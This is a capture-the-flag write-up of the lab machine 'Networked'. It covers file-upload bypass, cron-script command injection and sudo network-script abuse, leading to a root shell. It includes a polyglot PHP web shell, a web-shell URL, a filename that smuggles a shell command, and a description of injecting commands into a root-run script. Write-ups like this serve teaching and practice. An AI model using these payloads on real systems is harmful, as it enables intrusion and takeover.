# Networked

**Difficulty:** Medium | **OS:** Linux | **IP:** `10.129.71.171`

## Summary
**Networked** is a medium-difficulty Linux machine that demonstrates risks associated with insecure file upload filtering, cron job command injection vulnerabilities, and improper environment script execution via `sudo`. Initial access is achieved by bypassing a weak extension validation check on an upload form to deploy a polyglot web shell. Lateral movement to user `guly` is performed by exploiting a command injection vulnerability within a periodic cron script that evaluates unescaped filenames. Finally, privilege escalation to `root` is completed by abusing an insecure validation regular expression inside a `sudo`-restricted network configuration script that executes inputs directly via shell evaluation.

## Reconnaissance

### Port Scanning (Nmap)
We begin by enumerating active TCP ports and identifying service versions:

- **22**: SSH (OpenSSH 7.4 (CentOS))
- **80**: HTTP (Apache httpd 2.4.46 (PHP/5.4.16))

### Web Application Enumeration

1) Visiting the main page hosted on port 80 reveals a simple web application template along with comments in the source code: `<!-- upload and gallery not yet linked -->`.
2) Directory fuzzing uncovers hidden endpoints:

- _/uploads/_ — Storage directory for user uploads.
- _/photos.php_ — Gallery page displaying uploaded media.
- _/upload.php_ — File upload form interface.
- _/backup/_ — Archive folder containing source code backups (`backup.tar`).

## Exploitation (Initial Access)

### Flawed File Upload Validation (RCE)
Analyzing the source code retrieved from the `/backup/` directory reveals the file upload handling logic in `upload.php` and `lib.php`.

- **Vulnerability Mechanism:** The validation function (`check_file_type`) checks the file's extension and MIME type via `getimagesize()`, but fails to completely strip or block executable extensions if combined, or can be bypassed using a polyglot approach.
- **Execution:**

1) A payload file is crafted with a valid image magic header followed by executable PHP code:

```
GIF8;
<?php system($_GET['cmd']); ?>
```

2) The file is uploaded with a name designed to bypass regex restrictions (e.g., matching IP address format or standard extensions).
3) Navigating to the uploaded file path under `/uploads/` allows executing arbitrary system commands via the `cmd` parameter:

```http://10.129.71.171/uploads/10_10_14_28.php.gif?cmd=id```

4) Spawning a reverse shell payload via the web shell establishes an active session under the `apache` service user account.

## Lateral Movement (guly)

### Cron Job Command Injection
Enumerating local files belonging to user `guly` reveals a periodic script executed via cron (`/home/guly/check_attack.php`):

```
$files = array();
$files = preg_grep('/^([^.])/', scandir($path));
foreach ($files as $key => $value) {
    list ($name,$ext) = getnameCheck($value);
    $check = check_ip($name,$value);
    if (!($check[0])) {
        exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
        mail($to, $msg, $msg, $headers, "-F$value");
    }
}
```

- **Vulnerability Mechanism:** The cron script scans the `/var/www/html/uploads/` directory, iterates through filenames, and passes them directly into shell execution functions (`exec`) and mail arguments (`-F$value`) without sanitization.
- **Execution:**
  1) Creating a specially crafted filename containing shell redirection or command operators inside the uploads directory triggers command execution when the cron job runs.
  2) For example, creating a file with a base64-encoded reverse shell payload or command string:
     ```touch 'file; echo "bash -c ..." | bash;'```
  3) Upon cron execution, a shell session is spawned under the user context of `guly`, allowing retrieval of `user.txt`.

## Privilege Escalation (Root Flag)

### Sudo Permission Enumeration
Checking assigned `sudo` execution rights for user `guly` via `sudo -l` reveals access to a custom network script:

```
User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

### Analyzing changename.sh
Inspecting the script code reveals how interface configurations are gathered:

```
regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
	echo "interface $var:"
	read x
	while [[ ! $x =~ $regexp ]]; do
		echo "wrong input, try again"
		echo "interface $var:"
		read x
	done
	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```
- **Vulnerability Mechanism:** While the script uses a regular expression check (`^[a-zA-Z0-9_\ /-]+$`), the allowed characters include spaces (`\` ) and hyphens (`-`). When the configuration file is subsequently parsed or when `/sbin/ifup` executes, trailing inputs or shell metacharacters split across arguments can be leveraged to inject arbitrary commands or execute shell binaries because inputs are written directly into network-script configuration files.

- **Privilege Escalation Workflow:**

  1) **Execute the sudo-restricted script:**

    ```sudo /usr/local/sbin/changename.sh```

2) Input malicious arguments containing shell commands or binary paths (e.g., injecting `/bin/bash` or command options into variables like `PROXY_METHOD` or `BOOTPROTO` during the `read` prompt).
3) When the script calls interface activation tools, the injected commands evaluate with root privileges, spawning an interactive `root` shell.

Retrieving `root.txt` from `/root/root.txt` completes the machine compromise.
